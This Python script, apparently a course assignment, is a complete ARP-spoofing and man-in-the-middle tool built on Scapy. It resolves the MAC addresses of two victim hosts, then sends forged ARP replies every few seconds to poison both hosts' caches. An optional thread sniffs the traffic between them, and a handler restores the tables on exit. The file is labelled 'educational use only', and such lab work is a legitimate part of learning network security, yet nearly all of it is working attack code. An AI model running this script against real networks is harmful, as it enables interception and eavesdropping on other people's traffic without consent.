#!/usr/bin/env python3
"""
Task 1, Assignment 1
ARP Spoofing & MITM Script using Scapy
Usage: sudo python3 arp_spoof.py <victim1_ip> <victim2_ip>
"""

import sys
import time
import argparse
import signal
import socket
from scapy.all import (
    ARP, Ether, srp, sendp, sniff,
    get_if_hwaddr, conf
)


# Helpers 

def get_mac(ip: str) -> str:
    """Resolve MAC address for a given IP via ARP request."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_req, timeout=3, verbose=False)
    if not answered:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)
    return answered[0][1].hwsrc


# get own ip
def get_own_ip(iface: str) -> str:
    import subprocess
    result = subprocess.check_output(
        ["ip", "-4", "addr", "show", str(iface)],
        text=True
    )
    for line in result.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    print(f"[!] Could not determine IP for interface {iface}")
    sys.exit(1)


# ARP Spoofing 
def build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str) -> Ether:
    """
    Craft an ARP reply that tells target_ip:
      'the MAC for spoof_ip is MY mac' (attacker's mac).
    """
    attacker_mac = get_if_hwaddr(conf.iface) #get own MAC as attackers
    arp_reply = ARP(
        op=2,           # op=2  ->  ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
    )
    return Ether(dst=target_mac) / arp_reply


def restore_arp(target_ip: str, target_mac: str,
                source_ip: str, source_mac: str) -> None:
    """Send a legitimate ARP reply to restore the real mapping."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(pkt, count=5, verbose=False)
    print(f"[*] ARP table restored for {target_ip}")


# Packet Sniffer (bonus)

def packet_callback(pkt):
    """Print a brief summary of every captured packet."""
    print(f"  [sniff] {pkt.summary()}")


#Main 

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing / MITM tool (educational use only)"
    )
    parser.add_argument("victim1", help="IP address of victim 1")
    parser.add_argument("victim2", help="IP address of victim 2")
    parser.add_argument(
        "--iface", "-i",
        default=None,
        help="Network interface to use (default: Scapy auto-detect)",
    )
    parser.add_argument(
        "--interval", "-t",
        type=float,
        default=2.0,
        help="Seconds between each spoofed ARP burst (default: 2)",
    )
    parser.add_argument(
        "--sniff", "-s",
        action="store_true",
        help="Enable packet sniffing between the two victims (bonus)",
    )
    args = parser.parse_args()

    victim1_ip = args.victim1
    victim2_ip = args.victim2

    # user specified interface
    conf.iface = args.iface
 

    own_ip = get_own_ip(conf.iface)

    print(f"[*] Interface  : {conf.iface}")
    print(f"[*] Attacker IP: {own_ip}")
    print(f"[*] Victim 1   : {victim1_ip}")
    print(f"[*] Victim 2   : {victim2_ip}")

    # Resolve MACs
    print("[*] Resolving MAC addresses …")
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)
    print(f"    {victim1_ip}  →  {victim1_mac}")
    print(f"    {victim2_ip}  →  {victim2_mac}")

    # Graceful shutdown
    def shutdown(sig, frame):
        print("\n[!] Caught interrupt – restoring ARP tables …")
        restore_arp(victim1_ip, victim1_mac, victim2_ip, victim2_mac)
        restore_arp(victim2_ip, victim2_mac, victim1_ip, victim1_mac)
        print("[*] Done. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT,  shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    # Optional sniffer thread 
    if args.sniff:
        import threading
        bpf_filter = (
            f"host {victim1_ip} and host {victim2_ip}"
        )
        print(f"[*] Starting sniffer (filter: '{bpf_filter}') …")
        sniffer = threading.Thread(
            target=sniff, #use sniff function from scapy
            kwargs={
                "filter":  bpf_filter,
                "prn":     packet_callback, # use this as callback for every packet (args=pkt)
                "store":   False,
                "iface":   conf.iface,
            },
            daemon=True,
        )
        sniffer.start()

    # Spoof loop 
    print(f"[*] Starting ARP spoofing (Ctrl-C to stop) …\n")
    packets_sent = 0

    while True:
        # Tell victim1: "I am victim2"  (attacker's MAC -> victim2's IP)
        pkt1 = build_spoof_packet(victim1_ip, victim1_mac, victim2_ip)
        # Tell victim2: "I am victim1"
        pkt2 = build_spoof_packet(victim2_ip, victim2_mac, victim1_ip)

        sendp(pkt1, verbose=False)
        sendp(pkt2, verbose=False)
        packets_sent += 2

        print(
            f"\r[>] Packets sent: {packets_sent}  "
            f"| Spoofing {victim1_ip} ↔ {victim2_ip} via {own_ip}",
            end="", flush=True,
        )
        # sleep for argument interval
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
